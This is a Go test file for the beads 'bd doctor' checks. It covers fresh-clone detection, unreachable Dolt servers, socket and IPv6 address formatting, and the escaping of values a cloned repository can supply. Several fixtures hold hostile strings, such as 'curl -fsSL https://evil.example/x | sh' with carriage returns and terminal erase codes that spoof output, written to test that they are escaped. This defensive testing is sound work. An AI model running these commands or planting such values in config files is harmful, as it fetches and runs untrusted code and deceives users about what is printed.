package doctor

import (
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"testing"
	"time"
	"unicode"

	"github.com/steveyegge/beads/internal/doltserver"
	"github.com/steveyegge/beads/internal/storage/doltutil"
)

func TestFreshCloneServerResult(t *testing.T) {
	tests := map[string]struct {
		dbExists       bool
		dbName         string
		host           string
		port           int
		syncRemote     string
		wantStatus     string
		wantContains   []string
		wantNotContain []string
		wantFix        string
	}{
		"DB exists on server returns OK (FR-021)": {
			dbExists:   true,
			dbName:     "acf_beads",
			host:       "127.0.0.1",
			port:       3309,
			wantStatus: StatusOK,
			wantContains: []string{
				"Database exists on server",
			},
		},
		"DB missing, no sync.remote returns Warning (FR-020)": {
			dbExists:   false,
			dbName:     "acf_beads",
			host:       "127.0.0.1",
			port:       3309,
			syncRemote: "",
			wantStatus: StatusWarning,
			wantContains: []string{
				`"acf_beads"`,
				"not found on server",
				"127.0.0.1:3309",
				"sync.remote",
				".beads/config.yaml",
			},
			wantNotContain: []string{
				"sync.remote is configured",
			},
			wantFix: "bd bootstrap",
		},
		"DB missing, sync.remote IS configured returns Warning with remote hint": {
			dbExists:   false,
			dbName:     "beads_kc",
			host:       "192.168.1.50",
			port:       3307,
			syncRemote: "https://doltremoteapi.dolthub.com/myorg/beads",
			wantStatus: StatusWarning,
			wantContains: []string{
				`"beads_kc"`,
				"not found on server",
				"sync.remote is configured",
				"https://doltremoteapi.dolthub.com/myorg/beads",
				"bd bootstrap",
			},
			wantNotContain: []string{
				"Set sync.remote in .beads/config.yaml",
			},
			wantFix: "bd bootstrap",
		},
	}

	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			check := freshCloneServerResult(tt.dbExists, tt.dbName, tt.host, tt.port, "", tt.syncRemote)

			if check.Name != "Fresh Clone" {
				t.Errorf("expected Name %q, got %q", "Fresh Clone", check.Name)
			}

			if check.Status != tt.wantStatus {
				t.Errorf("expected Status %q, got %q (message: %s)", tt.wantStatus, check.Status, check.Message)
			}

			for _, want := range tt.wantContains {
				if !strings.Contains(check.Message, want) {
					t.Errorf("expected message to contain %q, got:\n%s", want, check.Message)
				}
			}

			for _, notWant := range tt.wantNotContain {
				if strings.Contains(check.Message, notWant) {
					t.Errorf("expected message NOT to contain %q, got:\n%s", notWant, check.Message)
				}
			}

			if tt.wantFix != "" && check.Fix != tt.wantFix {
				t.Errorf("expected Fix %q, got %q", tt.wantFix, check.Fix)
			}
		})
	}
}

func TestCheckFreshCloneDB_ServerUnreachable(t *testing.T) {
	// FR-030: When server is unreachable, should return Reachable=false
	// so caller skips the server-mode check without panic.
	result := checkFreshCloneDB("127.0.0.1", 1, "", "root", "", "nonexistent_db", false, false)
	if result.Reachable {
		t.Fatal("expected Reachable=false for connection refused")
	}
	if result.Err == nil {
		t.Fatal("expected non-nil error for connection refused")
	}
}

func TestCheckFreshClone_ServerModeUnreachable(t *testing.T) {
	// GH#35 + bd-tzo9: When metadata.json declares dolt_mode=server but the
	// server is unreachable, CheckFreshClone must:
	//   1. Resolve credentials by the resolved runtime port (bd-tzo9), not
	//      the deprecated metadata port default — exercised by going through
	//      the GetDoltServerPasswordForPort(port) call before the failed ping.
	//   2. Surface a server-mode-aware warning instead of the misleading
	//      legacy "Fresh clone detected (no database)" message (GH#35). In
	//      server mode the local DB absence is expected; suggesting bd
	//      bootstrap is wrong when the actual problem is connectivity/auth.
	tmpDir := t.TempDir()
	beadsDir := filepath.Join(tmpDir, ".beads")
	if err := os.MkdirAll(beadsDir, 0o755); err != nil {
		t.Fatal(err)
	}

	// JSONL with issues so the check proceeds past the fresh-clone gate.
	jsonl := `{"id":"bd-abc","title":"t"}` + "\n" + `{"id":"bd-def","title":"t"}` + "\n"
	if err := os.WriteFile(filepath.Join(beadsDir, "issues.jsonl"), []byte(jsonl), 0o644); err != nil {
		t.Fatal(err)
	}

	// metadata.json declaring server mode pointed at an unreachable host:port.
	// Port 1 is guaranteed-unreachable on loopback.
	meta := `{
  "database": "beads.db",
  "dolt_mode": "server",
  "dolt_server_host": "127.0.0.1",
  "dolt_server_port": 1,
  "dolt_server_user": "root",
  "dolt_database": "beads"
}`
	if err := os.WriteFile(filepath.Join(beadsDir, "metadata.json"), []byte(meta), 0o644); err != nil {
		t.Fatal(err)
	}

	check := CheckFreshClone(tmpDir)

	if check.Status != StatusWarning {
		t.Fatalf("expected %q on unreachable server, got %q (message: %s)",
			StatusWarning, check.Status, check.Message)
	}

	// GH#35: must NOT emit the misleading legacy "Fresh clone detected
	// (N issues in issues.jsonl, no database)" message in server mode.
	if strings.Contains(check.Message, "issues in issues.jsonl, no database") {
		t.Errorf("server-mode unreachable should not emit legacy fresh-clone message; got: %s", check.Message)
	}

	// Must call out server-mode connectivity, not "fresh clone".
	wantSubstrings := []string{"server", "127.0.0.1:1"}
	for _, want := range wantSubstrings {
		if !strings.Contains(strings.ToLower(check.Message), strings.ToLower(want)) {
			t.Errorf("expected message to mention %q, got: %s", want, check.Message)
		}
	}

	// Fix should suggest connectivity/credential checks, not bd bootstrap
	// (which won't help when the server itself is unreachable).
	if strings.Contains(check.Fix, "bd bootstrap") {
		t.Errorf("server-mode unreachable fix should not suggest 'bd bootstrap'; got: %s", check.Fix)
	}
	for _, want := range []string{"server", "credentials"} {
		if !strings.Contains(strings.ToLower(check.Fix), want) {
			t.Errorf("expected fix to mention %q, got: %s", want, check.Fix)
		}
	}
}

func TestFreshCloneServerUnreachableResult(t *testing.T) {
	// Pure-function coverage for the server-unreachable branch (GH#35).
	// Verifies the message identifies server mode, includes host:port and
	// the underlying error, and avoids the misleading bd bootstrap fix.
	check := freshCloneServerUnreachableResult(
		"acf_beads",
		"dolt.example.com",
		3306,
		"",
		errSentinelForTest{msg: "dial tcp: i/o timeout"},
	)

	if check.Name != "Fresh Clone" {
		t.Errorf("expected Name %q, got %q", "Fresh Clone", check.Name)
	}
	if check.Status != StatusWarning {
		t.Errorf("expected Status %q, got %q", StatusWarning, check.Status)
	}

	wantInMsg := []string{
		"unreachable",
		"dolt.example.com:3306",
		`"acf_beads"`,
		"server mode",
	}
	for _, want := range wantInMsg {
		if !strings.Contains(check.Message, want) {
			t.Errorf("expected message to contain %q, got: %s", want, check.Message)
		}
	}

	if !strings.Contains(check.Detail, "dial tcp: i/o timeout") {
		t.Errorf("expected detail to surface underlying error, got: %s", check.Detail)
	}

	// Must NOT recommend bd bootstrap — the problem is connectivity, not
	// missing local state.
	if strings.Contains(check.Fix, "bd bootstrap") {
		t.Errorf("server-unreachable fix should not suggest 'bd bootstrap'; got: %s", check.Fix)
	}

	// An IPv6 host, configured bare or bracketed, is named as [host]:port in
	// both the unreachable and the missing-database message.
	for _, host := range []string{"::1", "[::1]"} {
		for name, msg := range map[string]string{
			"unreachable": freshCloneServerUnreachableResult("acf_beads", host, 3309, "", nil).Message,
			"missing db":  freshCloneServerResult(false, "acf_beads", host, 3309, "", "").Message,
		} {
			if !strings.Contains(msg, "[::1]:3309") || strings.Contains(msg, "[[::1]]") || strings.Contains(msg, " ::1:3309") {
				t.Errorf("%s message for host %q must name the server as [::1]:3309, got: %s", name, host, msg)
			}
		}
	}

	// Nil error path should still produce a usable message and not panic.
	checkNil := freshCloneServerUnreachableResult("beads", "127.0.0.1", 3307, "", nil)
	if checkNil.Status != StatusWarning {
		t.Errorf("nil-err path: expected Status %q, got %q", StatusWarning, checkNil.Status)
	}
	if !strings.Contains(checkNil.Message, "unreachable") {
		t.Errorf("nil-err path: expected message to mention 'unreachable', got: %s", checkNil.Message)
	}
}

// TestFreshCloneServerResultsNameTheTransportDialed pins both server-mode
// Fresh Clone messages to the transport the check dialed. When it dialed a
// socket, as for a live BEADS_DOLT_SERVER_SOCKET beside a resolved port
// (freshCloneRepairTransport), the message names unix:<socket>, not the
// host:port nothing queried, and the unreachable checklist names the socket
// setting (#7874 review).
func TestFreshCloneServerResultsNameTheTransportDialed(t *testing.T) {
	const socket = "/tmp/bd-test/dolt.sock"
	for name, check := range map[string]DoctorCheck{
		"missing db":  freshCloneServerResult(false, "beads", "127.0.0.1", 3309, socket, ""),
		"unreachable": freshCloneServerUnreachableResult("beads", "127.0.0.1", 3309, socket, nil),
	} {
		if !strings.Contains(check.Message, "unix:"+socket) || strings.Contains(check.Message, "127.0.0.1:3309") {
			t.Errorf("%s message must name unix:%s, the socket dialed, not 127.0.0.1:3309: %s", name, socket, check.Message)
		}
	}
	if fix := freshCloneServerUnreachableResult("beads", "127.0.0.1", 3309, socket, nil).Fix; !strings.Contains(fix, "dolt_server_socket") {
		t.Errorf("unreachable fix after a socket dial must name dolt_server_socket: %s", fix)
	}
	if fix := freshCloneServerUnreachableResult("beads", "127.0.0.1", 3309, "", nil).Fix; strings.Contains(fix, "dolt_server_socket") {
		t.Errorf("unreachable fix after a TCP dial names dolt_server_socket: %s", fix)
	}
}

// TestFreshCloneDetectedClassifiesEachResult pins which Fresh Clone results
// bd doctor --fix repairs by importing issues.jsonl (FreshCloneDetected): the
// ones that found the workspace's database missing, on the server or, outside
// server mode, on disk. A check that could not log in to the server, or has
// no address for it, says it is not a fresh clone, and --fix imported over
// the live database there all the same (#7874 review).
func TestFreshCloneDetectedClassifiesEachResult(t *testing.T) {
	for name, tc := range map[string]struct {
		check DoctorCheck
		want  bool
	}{
		"database missing on the server":    {check: freshCloneServerResult(false, "beads", "127.0.0.1", 3309, "", ""), want: true},
		"database missing, sync.remote set": {check: freshCloneServerResult(false, "beads", "127.0.0.1", 3309, "", "origin"), want: true},
		"database exists on the server":     {check: freshCloneServerResult(true, "beads", "127.0.0.1", 3309, "", "")},
		"server unreachable":                {check: freshCloneServerUnreachableResult("beads", "127.0.0.1", 3309, "", nil)},
		"no server address":                 {check: freshCloneServerUnresolvedResult("beads", doltserver.Endpoint{Host: "127.0.0.1", AutoStartDisabled: true})},
	} {
		if got := FreshCloneDetected(tc.check.Message); got != tc.want {
			t.Errorf("%s: FreshCloneDetected(%q) = %v, want %v", name, tc.check.Message, got, tc.want)
		}
	}

	// Outside server mode the check finds the database missing on disk.
	tmpDir := t.TempDir()
	beadsDir := filepath.Join(tmpDir, ".beads")
	if err := os.MkdirAll(beadsDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(beadsDir, "issues.jsonl"), []byte(`{"id":"test-1"}`+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), []byte("backend: dolt\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if local := CheckFreshClone(tmpDir); local.Status != StatusWarning || !FreshCloneDetected(local.Message) {
		t.Errorf("local fresh clone: FreshCloneDetected(%q) = false (status %s), want true", local.Message, local.Status)
	}
}

// errSentinelForTest is a minimal error type used to drive the server-unreachable
// helper without depending on the network/MySQL driver. Local to this test file.
type errSentinelForTest struct{ msg string }

func (e errSentinelForTest) Error() string { return e.msg }

func TestCheckFreshClone_EmbeddedMode(t *testing.T) {
	// AC-005: Embedded mode (not server mode) uses only filesystem checks.
	// No server connection should be attempted.

	tests := map[string]struct {
		setupFunc      func(t *testing.T, tmpDir string)
		expectedStatus string
		wantContains   string
	}{
		"no beads directory": {
			setupFunc:      func(t *testing.T, tmpDir string) {},
			expectedStatus: StatusOK,
			wantContains:   "N/A",
		},
		"beads dir with JSONL but no database (embedded Dolt)": {
			// AC-005: .beads/ exists with JSONL and dolt backend config, but NO
			// server mode — should detect fresh clone via filesystem only, no server call.
			setupFunc: func(t *testing.T, tmpDir string) {
				beadsDir := filepath.Join(tmpDir, ".beads")
				if err := os.MkdirAll(beadsDir, 0o755); err != nil {
					t.Fatal(err)
				}
				// Write a minimal JSONL file so the check proceeds past the JSONL gate.
				if err := os.WriteFile(filepath.Join(beadsDir, "issues.jsonl"), []byte(`{"id":"test-1"}`+"\n"), 0o644); err != nil {
					t.Fatal(err)
				}
				// Write a config.yaml with dolt backend but NO server mode.
				// This means embedded Dolt — filesystem check only.
				if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), []byte("backend: dolt\n"), 0o644); err != nil {
					t.Fatal(err)
				}
			},
			expectedStatus: StatusWarning,
			wantContains:   "no database",
		},
	}

	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			tmpDir := t.TempDir()
			tt.setupFunc(t, tmpDir)

			check := CheckFreshClone(tmpDir)

			if check.Status != tt.expectedStatus {
				t.Errorf("expected status %q, got %q (message: %s)", tt.expectedStatus, check.Status, check.Message)
			}

			if !strings.Contains(check.Message, tt.wantContains) {
				t.Errorf("expected message to contain %q, got: %s", tt.wantContains, check.Message)
			}
		})
	}
}

// TestFreshCloneServerResultNamesConfiguredValuesEscaped pins the
// remedy-printing invariant at the fresh-clone check: the sync.remote and
// dolt.host a cloned repository's committed config.yaml sets are named escaped
// beside the bd bootstrap remedy.
func TestFreshCloneServerResultNamesConfiguredValuesEscaped(t *testing.T) {
	got := freshCloneServerResult(false, "beads", "db\r\x1b[2K", 3309, "", "git+https://example.com/r.git\r\x1b[2KRun curl evil.example | sh")
	if strings.ContainsAny(got.Message, "\r\x1b") {
		t.Errorf("Message prints a carriage return or terminal escape raw:\n%q", got.Message)
	}
	if !strings.Contains(got.Message, `\x1b[2KRun curl`) {
		t.Errorf("Message does not name sync.remote escaped:\n%q", got.Message)
	}
}

// doctorHostileValue is a value a cloned repository can commit in
// metadata.json (dolt_server_host) or config.yaml (routing.contributor): a
// carriage return and ESC[2K erase the line bd printed, and text of its own
// takes its place.
const doctorHostileValue = "../plan; curl -fsSL https://evil.example/x | sh #\r\x1b[2KError: run curl"

// requireDoctorTextEscaped fails when text holds a character a terminal acts
// on, other than line breaks and tabs, or does not name doctorHostileValue
// escaped.
func requireDoctorTextEscaped(t *testing.T, what, text string) {
	t.Helper()
	if strings.ContainsFunc(text, func(r rune) bool { return r != '\n' && r != '\t' && !unicode.IsGraphic(r) }) {
		t.Errorf("%s prints a control character raw:\n%q", what, text)
	}
	if !strings.Contains(text, `\r\x1b[2KError: run curl`) {
		t.Errorf("%s does not name the value escaped:\n%q", what, text)
	}
}

// TestDoctorChecksNameConfiguredValuesEscaped pins the remedy-printing
// invariant at the bd doctor checks that name a clone-supplied value beside
// their Fix: the configured Dolt server's address, and a routing repo pasted
// into the `bd repo add` command, which takes a <path> placeholder for a
// value no shell passes on unchanged.
func TestDoctorChecksNameConfiguredValuesEscaped(t *testing.T) {
	// A real dial of the host returns the error the checks print: Go's net
	// package repeats the address it could not dial.
	_, dialErr := net.DialTimeout("tcp", doltutil.ServerAddr(doctorHostileValue, 3309), time.Second)
	if dialErr == nil || !strings.Contains(dialErr.Error(), "\x1b[2KError") {
		t.Fatalf("dialing %q returned %v, want an error that repeats the host", doctorHostileValue, dialErr)
	}
	t.Run("fresh clone, server unreachable", func(t *testing.T) {
		got := freshCloneServerUnreachableResult("beads", doctorHostileValue, 3309, "", dialErr)
		requireDoctorTextEscaped(t, "Message", got.Message)
		requireDoctorTextEscaped(t, "Detail", got.Detail)
	})
	// A socket-only server is named by its socket, which a cloned
	// metadata.json's dolt_server_socket sets.
	t.Run("fresh clone, socket-only server", func(t *testing.T) {
		missing := freshCloneServerResult(false, "beads", "127.0.0.1", 0, "/tmp/"+doctorHostileValue, "")
		requireDoctorTextEscaped(t, "missing database Message", missing.Message)
		unreachable := freshCloneServerUnreachableResult("beads", "127.0.0.1", 0, "/tmp/"+doctorHostileValue, nil)
		requireDoctorTextEscaped(t, "unreachable Message", unreachable.Message)
	})
	t.Run("server reachable", func(t *testing.T) {
		got := checkServerReachable(doctorHostileValue, 1)
		requireDoctorTextEscaped(t, "Message", got.Message)
		requireDoctorTextEscaped(t, "Detail", got.Detail)
	})
	t.Run("a check's printed form", func(t *testing.T) {
		check := DoctorCheck{Name: "n" + doctorHostileValue, Message: "m" + doctorHostileValue,
			Detail: "d: " + dialErr.Error(), Fix: "f" + doctorHostileValue}.Printed()
		for what, text := range map[string]string{"Name": check.Name, "Message": check.Message, "Detail": check.Detail, "Fix": check.Fix} {
			requireDoctorTextEscaped(t, what, text)
		}
		plain := DoctorCheck{Name: "Dolt", Message: "ok", Detail: "line one\n  line two", Fix: "Run: bd doctor --fix"}
		if got := plain.Printed(); got != plain {
			t.Errorf("Printed() changed a check with nothing to escape: %+v", got)
		}
	})
	t.Run("vestigial sync worktree", func(t *testing.T) {
		if runtime.GOOS == "windows" {
			t.Skip("a Windows file name cannot hold a control character")
		}
		repo := filepath.Join(t.TempDir(), "my repo"+doctorHostileValue)
		for _, dir := range []string{".git", ".beads", ".beads-sync"} {
			if err := os.MkdirAll(filepath.Join(repo, dir), 0o755); err != nil {
				t.Fatal(err)
			}
		}
		if err := os.WriteFile(filepath.Join(repo, ".beads", "redirect"), []byte("../other/.beads\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		got := CheckNoVestigialSyncWorktrees(repo)
		requireDoctorTextEscaped(t, "Detail", got.Detail)
		requireDoctorTextEscaped(t, "Fix", got.Fix)
		if !strings.HasPrefix(got.Fix, "Remove with: rm -rf <path>  (<path>: ") {
			t.Errorf("the rm -rf remedy pastes a path no shell passes on unchanged:\n%s", got.Fix)
		}
		spaced := filepath.Join(t.TempDir(), "my repo")
		for _, dir := range []string{".git", ".beads", ".beads-sync"} {
			if err := os.MkdirAll(filepath.Join(spaced, dir), 0o755); err != nil {
				t.Fatal(err)
			}
		}
		if err := os.WriteFile(filepath.Join(spaced, ".beads", "redirect"), []byte("../other/.beads\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		if got, want := CheckNoVestigialSyncWorktrees(spaced).Fix, "Remove with: rm -rf '"+filepath.Join(spaced, ".beads-sync")+"'"; got != want {
			t.Errorf("Fix = %q, want %q: a path with a space goes into rm -rf as one word", got, want)
		}
	})
	t.Run("stale legacy hooks rm", func(t *testing.T) {
		if runtime.GOOS == "windows" {
			t.Skip("the rows spell the POSIX quoting")
		}
		// The hooks directory can be one the repository commits
		// (core.hooksPath), so the file names, like the checkout path, are
		// the clone's.
		got := staleFilesRemoveCommand(runtime.GOOS, []string{
			"/w/My Projects/app/.beads-hooks/pre-commit.legacy",
			"/w/app/.beads-hooks/a;b.legacy",
			"/w/app/.beads-hooks/x" + doctorHostileValue,
		})
		requireDoctorTextEscaped(t, "Fix", got)
		want := "rm '/w/My Projects/app/.beads-hooks/pre-commit.legacy' '/w/app/.beads-hooks/a;b.legacy' <file3>  (<file3>: "
		if !strings.HasPrefix(got, want) {
			t.Errorf("rm command = %q, want it to start %q: each path goes in as one shell word", got, want)
		}
		if got, want := staleFilesRemoveCommand(runtime.GOOS, []string{"/w/app/.git/hooks/pre-commit.legacy"}), "rm /w/app/.git/hooks/pre-commit.legacy"; got != want {
			t.Errorf("rm command = %q, want %q unchanged", got, want)
		}
	})
	for _, key := range []string{"contributor", "maintainer"} {
		t.Run("routing."+key+" not hydrated", func(t *testing.T) {
			tmpDir := t.TempDir()
			beadsDir := filepath.Join(tmpDir, ".beads")
			if err := os.MkdirAll(beadsDir, 0o755); err != nil {
				t.Fatal(err)
			}
			config := "routing:\n  mode: auto\n  " + key + ": " + strconv.Quote(doctorHostileValue) +
				"\nrepos:\n  additional:\n    - ~/other-repo\n"
			if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), []byte(config), 0o644); err != nil {
				t.Fatal(err)
			}
			issues := strings.Join(checkYAMLConfigValues(tmpDir), "\n")
			requireDoctorTextEscaped(t, "checkYAMLConfigValues", issues)
			if !strings.Contains(issues, "Run bd repo add <path>  (<path>: ") {
				t.Errorf("the bd repo add remedy pastes a value no shell passes on unchanged:\n%s", issues)
			}
		})
	}
}
